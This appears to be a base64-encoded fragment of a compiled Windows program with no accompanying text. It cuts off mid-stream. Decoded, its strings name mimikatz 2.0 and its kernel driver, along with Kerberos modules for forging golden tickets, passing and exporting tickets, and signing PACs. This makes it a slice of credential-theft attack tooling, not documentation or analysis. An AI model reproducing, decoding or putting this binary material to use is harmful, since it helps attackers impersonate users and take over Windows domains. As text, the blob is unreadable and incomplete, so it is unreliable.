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lAHIAbgBlAGwAXwBpAG8AYwB0AGwAIAA7ACAARABlAHYAaQBjAGUASQBvAEMAbwBuAHQAcgBvAGwAIAAoADAAeAAlADAAOAB4ACkAIAA6ACAAMAB4ACUAMAA4AHgACgAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABcAFwALgBcAG0AaQBtAGkAZAByAHYAAAAlAGMAAAAAAGEAAAAAAAAAIgAlAHMAIgAgAHMAZQByAHYAaQBjAGUAIABwAGEAdABjAGgAZQBkAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABTAGUAcgB2AGkAYwBlACAAaQBzACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIAB2AGUAcgBzAGkAbwBuACAAaQBuACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABRAFcATwBSAEQAAAAAAAAAUgBFAFMATwBVAFIAQwBFAF8AUgBFAFEAVQBJAFIARQBNAEUATgBUAFMAXwBMAEkAUwBUAAAAAABGAFUATABMAF8AUgBFAFMATwBVAFIAQwBFAF8ARABFAFMAQwBSAEkAUABUAE8AUgAAAAAAAAAAAFIARQBTAE8AVQBSAEMARQBfAEwASQBTAFQAAAAAAAAATQBVAEwAVABJAF8AUwBaAAAAAAAAAAAATABJAE4ASwAAAAAAAAAAAEQAVwBPAFIARABfAEIASQBHAF8ARQBOAEQASQBBAE4AAAAAAAAAAABEAFcATwBSAEQAAAAAAAAAQgBJAE4AQQBSAFkAAAAAAEUAWABQAEEATgBEAF8AUwBaAAAAUwBaAAAAAAAAAAAATgBPAE4ARQAAAAAAAAAAAFMAZQByAHYAaQBjAGUAcwBBAGMAdABpAHYAZQAAAAAAXAB4ACUAMAAyAHgAAAAAADAAeAAlADAAMgB4ACwAIAAAAAAAAAAAACUAMAAyAHgAIAAAAAAAAAAlADAAMgB4AAAAAAAKAAAAJQBzACAAAAAlAHMAAAAAACUAdwBaAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBzAHQAcgBpAG4AZwBfAGQAaQBzAHAAbABhAHkAUwBJAEQAIAA7ACAAQwBvAG4AdgBlAHIAdABTAGkAZABUAG8AUwB0AHIAaQBuAGcAUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFQAbwBrAGUAbgAAAAAAAABtAGkAbQBpAGsAYQB0AHoAIAAyAC4AMAAgAGEAbABwAGgAYQAgAHgANgA0AAAAAAAAAAAAAAAAAAoAIAAgAC4AIwAjACMAIwAjAC4AIAAgACAAbQBpAG0AaQBrAGEAdAB6ACAAMgAuADAAIABhAGwAcABoAGEAIAAoAHgANgA0ACkAIAByAGUAbABlAGEAcwBlACAAIgBLAGkAdwBpACAAZQBuACAAQwAiACAAKABBAHAAcgAgADEANAAgADIAMAAxADQAIAAxADYAOgAzADQAOgAzADEAKQAKACAALgAjACMAIABeACAAIwAjAC4AIAAgAAoAIAAjACMAIAAvACAAXAAgACMAIwAgACAALwAqACAAKgAgACoACgAgACMAIwAgAFwAIAAvACAAIwAjACAAIAAgAEIAZQBuAGoAYQBtAGkAbgAgAEQARQBMAFAAWQAgAGAAZwBlAG4AdABpAGwAawBpAHcAaQBgACAAKAAgAGIAZQBuAGoAYQBtAGkAbgBAAGcAZQBuAHQAaQBsAGsAaQB3AGkALgBjAG8AbQAgACkACgAgACcAIwAjACAAdgAgACMAIwAnACAAIAAgAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGcAZQBuAHQAaQBsAGsAaQB3AGkALgBjAG8AbQAvAG0AaQBtAGkAawBhAHQAegAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACgAbwBlAC4AZQBvACkACgAgACAAJwAjACMAIwAjACMAJwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB3AGkAdABoACAAJQAzAHUAIABtAG8AZAB1AGwAZQBzACAAKgAgACoAIAAqAC8ACgAKAAAAAAAAAAoAbQBpAG0AaQBrAGEAdAB6ACgAYwBvAG0AbQBhAG4AZABsAGkAbgBlACkAIAAjACAAJQBzAAoAAAAAAAAAAAAKAG0AaQBtAGkAawBhAHQAegAgACMAIAAAAAAAAAAAACUAWwBeAAoAXQBzAAAAAAAlAHMACgAAAEkATgBJAFQAAAAAAAAAAABDAEwARQBBAE4AAAAAAAAAPgA+AD4AIAAlAHMAIABvAGYAIAAnACUAcwAnACAAbQBvAGQAdQBsAGUAIABmAGEAaQBsAGUAZAAgADoAIAAlADAAOAB4AAoAAAAAADoAOgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAbQBpAG0AaQBrAGEAdAB6AF8AZABvAEwAbwBjAGEAbAAgADsAIAAiACUAcwAiACAAbQBvAGQAdQBsAGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgACEACgAAAAAAAAAKACUAMQA2AHMAAAAAAAAAIAAgAC0AIAAgACUAcwAAACAAIABbACUAcwBdAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAG0AaQBtAGkAawBhAHQAegBfAGQAbwBMAG8AYwBhAGwAIAA7ACAAIgAlAHMAIgAgAGMAbwBtAG0AYQBuAGQAIABvAGYAIAAiACUAcwAiACAAbQBvAGQAdQBsAGUAIABuAG8AdAAgAGYAbwB1AG4AZAAgACEACgAAAAAAAAAKAE0AbwBkAHUAbABlACAAOgAJACUAcwAAAAAAAAAAAAoARgB1AGwAbAAgAG4AYQBtAGUAIAA6AAkAJQBzAAAACgBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAA6AAkAJQBzAAAAAAAAAEtlcmJlcm9zAAAAAAAAAABXAGkAbABsAHkAIABXAG8AbgBrAGEAIABmAGEAYwB0AG8AcgB5AAAAZwBvAGwAZABlAG4AAAAAAFAAdQByAGcAZQAgAHQAaQBjAGsAZQB0ACgAcwApAAAAcAB1AHIAZwBlAAAAAAAAAFIAZQB0AHIAaQBlAHYAZQAgAGMAdQByAHIAZQBuAHQAIABUAEcAVAAAAAAAAAAAAHQAZwB0AAAATABpAHMAdAAgAHQAaQBjAGsAZQB0ACgAcwApAAAAAABsAGkAcwB0AAAAAAAAAAAAUABhAHMAcwAtAHQAaABlAC0AdABpAGMAawBlAHQAIABbAE4AVAAgADYAXQAAAAAAcAB0AHQAAAAAAAAAAAAAAEsAZQByAGIAZQByAG8AcwAgAHAAYQBjAGsAYQBnAGUAIABtAG8AZAB1AGwAZQAAAGsAZQByAGIAZQByAG8AcwAAAAAAAAAAAAAAAAAAAAAAVABpAGMAawBlAHQAIAAnACUAcwAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABzAHUAYgBtAGkAdAB0AGUAZAAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAHMAZQBzAHMAaQBvAG4ACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUwB1AGIAbQBpAHQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFMAdQBiAG0AaQB0AFQAaQBjAGsAZQB0AE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdAB0ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AcAB0AHQAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIAB0AGkAYwBrAGUAdAAgAGYAaQBsAGUAbgBhAG0AZQAKAAAAVABpAGMAawBlAHQAKABzACkAIABwAHUAcgBnAGUAIABmAG8AcgAgAGMAdQByAHIAZQBuAHQAIABzAGUAcwBzAGkAbwBuACAAaQBzACAATwBLAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBwAHUAcgBnAGUAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUAB1AHIAZwBlAFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHAAdQByAGcAZQAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBQAHUAcgBnAGUAVABpAGMAawBlAHQAQwBhAGMAaABlAE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAABLAGUAYgBlAHIAbwBzACAAVABHAFQAIABvAGYAIABjAHUAcgByAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgAgADoAIAAAAAAAAAAAAAAAAAAAAAoAKABOAFUATABMACAAcwBlAHMAcwBpAG8AbgAgAGsAZQB5ACAAbQBlAGEAbgBzACAAYQBsAGwAbwB3AHQAZwB0AHMAZQBzAHMAaQBvAG4AawBlAHkAIABpAHMAIABuAG8AdAAgAHMAZQB0ACAAdABvACAAMQApAAoAAAAAAAAAbgBvACAAdABpAGMAawBlAHQAIAAhAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAHQAZwB0ACAAOwAgAEwAcwBhAEMAYQBsAGwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUAIABLAGUAcgBiAFIAZQB0AHIAaQBlAHYAZQBUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwB0AGcAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgADoAIAAlADAAOAB4AAoAAAAAAGUAeABwAG8AcgB0AAAAAAAKAFsAJQAwADgAeABdACAALQAgACUAMAAyAHgAAAAAAAoAIAAgACAAUwB0AGEAcgB0AC8ARQBuAGQALwBNAGEAeABSAGUAbgBlAHcAOgAgAAAAAAAAAAAAIAA7ACAAAAAAAAAAAAAAAAoAIAAgACAAUwBlAHIAdgBlAHIAIABOAGEAbQBlACAAIAAgACAAIAAgACAAOgAgACUAdwBaACAAQAAgACUAdwBaAAAAAAAAAAAAAAAAAAAACgAgACAAIABDAGwAaQBlAG4AdAAgAE4AYQBtAGUAIAAgACAAIAAgACAAIAA6ACAAJQB3AFoAIABAACAAJQB3AFoAAAAAAAAACgAgACAAIABGAGwAYQBnAHMAIAAlADAAOAB4ACAAIAAgACAAOgAgAAAAAAAAAAAAJQBzACAAOwAgAAAAAAAAAGsAaQByAGIAaQAAAAAAAAAKACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAIAAgACAAIAA6ACAAJQBzAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUgBlAHQAcgBpAGUAdgBlAEUAbgBjAG8AZABlAGQAVABpAGMAawBlAHQATQBlAHMAcwBhAGcAZQAgAC8AIABQAGEAYwBrAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBSAGUAdAByAGkAZQB2AGUARQBuAGMAbwBkAGUAZABUAGkAYwBrAGUAdABNAGUAcwBzAGEAZwBlACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGwAaQBzAHQAIAA7ACAATABzAGEAQwBhAGwAbABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AUABhAGMAawBhAGcAZQAgAEsAZQByAGIAUQB1AGUAcgB5AFQAaQBjAGsAZQB0AEMAYQBjAGgAZQBFAHgAMgBNAGUAcwBzAGEAZwBlACAALwAgAFAAYQBjAGsAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AbABpAHMAdAAgADsAIABMAHMAYQBDAGEAbABsAEEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgBQAGEAYwBrAGEAZwBlACAASwBlAHIAYgBRAHUAZQByAHkAVABpAGMAawBlAHQAQwBhAGMAaABlAEUAeAAyAE0AZQBzAHMAYQBnAGUAIAA6ACAAJQAwADgAeAAKAAAAAAAAAAAAJQB1AC0AJQAwADgAeAAtACUAdwBaAEAAJQB3AFoALQAlAHcAWgAuACUAcwAAAAAAdABpAGMAawBlAHQALgBrAGkAcgBiAGkAAAAAAAAAAAB0AGkAYwBrAGUAdAAAAAAAYQBkAG0AaQBuAAAAAAAAAHUAcwBlAHIAAAAAAAAAAABkAG8AbQBhAGkAbgAAAAAAcwBpAGQAAABrAHIAYgB0AGcAdAAAAAAAaQBkAAAAAABnAHIAbwB1AHAAcwAAAAAAAAAAAAAAAABVAHMAZQByACAAIAAgACAAIAAgADoAIAAlAHMACgBEAG8AbQBhAGkAbgAgACAAIAAgADoAIAAlAHMACgBTAEkARAAgACAAIAAgACAAIAAgADoAIAAlAHMACgBVAHMAZQByACAASQBkACAAIAAgADoAIAAlAHUACgAAAAAAAAAAAEcAcgBvAHUAcABzACAASQBkACAAOgAgACoAAAAAAAAAJQB1ACAAAAAKAGsAcgBiAHQAZwB0ACAAIAAgACAAOgAgAAAAAAAAAC0APgAgAFQAaQBjAGsAZQB0ACAAOgAgACUAcwAKAAoAAAAAAAAAAAAKAEYAaQBuAGEAbAAgAFQAaQBjAGsAZQB0ACAAUwBhAHYAZQBkACAAdABvACAAZgBpAGwAZQAgACEACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIAAKAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHcAcgBpAHQAZQBEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAEMAcgBlAGQAIABlAHIAcgBvAHIACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAEsAcgBiAHQAZwB0ACAAawBlAHkAIABzAGkAegBlACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAawByAGIAdABnAHQAIABhAHIAZwB1AG0AZQBuAHQACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAAUwBJAEQAIABzAGUAZQBtAHMAIABpAG4AdgBhAGwAaQBkACAALQAgAEMAbwBuAHYAZQByAHQAUwB0AHIAaQBuAGcAUwBpAGQAVABvAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgAgADsAIABNAGkAcwBzAGkAbgBnACAAUwBJAEQAIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAYgBlAHIAbwBzAF8AZwBvAGwAZABlAG4AIAA7ACAATQBpAHMAcwBpAG4AZwAgAGQAbwBtAGEAaQBuACAAYQByAGcAdQBtAGUAbgB0AAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAGIAZQByAG8AcwBfAGcAbwBsAGQAZQBuACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAGQAbQBpAG4AIABhAHIAZwB1AG0AZQBuAHQACgAAAAAAIAAqACAAUABBAEMAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAAAAAACAAKgAgAFAAQQBDACAAcwBpAGcAbgBlAGQACgAAAAAAIAAqACAARQBuAGMAVABpAGMAawBlAHQAUABhAHIAdAAgAGcAZQBuAGUAcgBhAHQAZQBkAAoAAAAgACoAIABFAG4AYwBUAGkAYwBrAGUAdABQAGEAcgB0ACAAZQBuAGMAcgB5AHAAdABlAGQACgAAACAAKgAgAEsAcgBiAEMAcgBlAGQAIABnAGUAbgBlAHIAYQB0AGUAZAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBnAG8AbABkAGUAbgBfAGQAYQB0AGEAIAA7ACAAawB1AGgAbABfAG0AXwBrAGUAcgBiAGUAcgBvAHMAXwBlAG4AYwByAHkAcAB0ACAAJQAwADgAeAAKAAAAAAAAAHIAZQBzAGUAcgB2AGUAZAAAAAAAAAAAAGYAbwByAHcAYQByAGQAYQBiAGwAZQAAAGYAbwByAHcAYQByAGQAZQBkAAAAAAAAAHAAcgBvAHgAaQBhAGIAbABlAAAAAAAAAHAAcgBvAHgAeQAAAAAAAABtAGEAeQBfAHAAbwBzAHQAZABhAHQAZQAAAAAAAAAAAHAAbwBzAHQAZABhAHQAZQBkAAAAAAAAAGkAbgB2AGEAbABpAGQAAAByAGUAbgBlAHcAYQBiAGwAZQAAAAAAAABpAG4AaQB0AGkAYQBsAAAAcAByAGUAXwBhAHUAdABoAGUAbgB0AAAAaAB3AF8AYQB1AHQAaABlAG4AdAAAAAAAbwBrAF8AYQBzAF8AZABlAGwAZQBnAGEAdABlAAAAAAA/AAAAAAAAAG4AYQBtAGUAXwBjAGEAbgBvAG4AaQBjAGEAbABpAHoAZQAAAAAAAAAKAAkAIAAgACAAUwB0AGEAcgB0AC8ARQBuAGQALwBNAGEAeABSAGUAbgBlAHcAOgAgAAAAAAAAAAoACQAgACAAIABTAGUAcgB2AGkAYwBlACAATgBhAG0AZQAgAAAAAAAKAAkAIAAgACAAVABhAHIAZwBlAHQAIABOAGEAbQBlACAAIAAAAAAACgAJACAAIAAgAEMAbABpAGUAbgB0ACAATgBhAG0AZQAgACAAAAAAACAAKAAgACUAdwBaACAAKQAAAAAAAAAAAAoACQAgACAAIABGAGwAYQBnAHMAIAAlADAAOAB4ACAAIAAgACAAOgAgAAAAAAAAAAoACQAgACAAIABTAGUAcwBzAGkAbwBuACAASwBlAHkAIAAgACgAJQAwADIAeAApACAAOgAgAAAACgAJACAAIAAgAFQAaQBjAGsAZQB0ACAAIAAoACUAMAAyAHgAIAAtACAAJQAwADIAeAApACAAOgAgAAAAAAAAAFsALgAuAC4AXQAAAAAAAAAoACUAMAAyAGgAdQApACAAOgAgAAAAAAAlAHcAWgAgADsAIAAAAAAAKAAtAC0AKQAgADoAIAAAAEAAIAAlAHcAWgAAAAAAAABQAFIATwBWAF8AUgBTAEEAXwBBAEUAUwAAAAAAAAAAAFAAUgBPAFYAXwBSAEUAUABMAEEAQwBFAF8ATwBXAEYAAAAAAAAAAABQAFIATwBWAF8ASQBOAFQARQBMAF8AUwBFAEMAAAAAAFAAUgBPAFYAXwBSAE4ARwAAAAAAAAAAAFAAUgBPAFYAXwBTAFAAWQBSAFUAUwBfAEwAWQBOAEsAUwAAAAAAAABQAFIATwBWAF8ARABIAF8AUwBDAEgAQQBOAE4ARQBMAAAAAAAAAAAAUABSAE8AVgBfAEUAQwBfAEUAQwBOAFIAQQBfAEYAVQBMAEwAAAAAAFAAUgBPAFYAXwBFAEMAXwBFAEMARABTAEEAXwBGAFUATABMAAAAAABQAFIATwBWAF8ARQBDAF8ARQBDAE4AUgBBAF8AUwBJAEcAAAAAAAAAUABSAE8AVgBfAEUAQwBfAEUAQwBEAFMAQQBfAFMASQBHAAAAAAAAAFAAUgBPAFYAXwBEAFMAUwBfAEQASAAAAFAAUgBPAFYAXwBSAFMAQQBfAFMAQwBIAEEATgBOAEUATAAAAAAAAABQAFIATwBWAF8AUwBTAEwAAAAAAAAAAABQAFIATwBWAF8ATQBTAF8ARQBYAEMASABBAE4ARwBFAAAAAAAAAAAAUABSAE8AVgBfAEYATwBSAFQARQBaAFoAQQAAAAAAAABQAFIATwBWAF8ARABTAFMAAA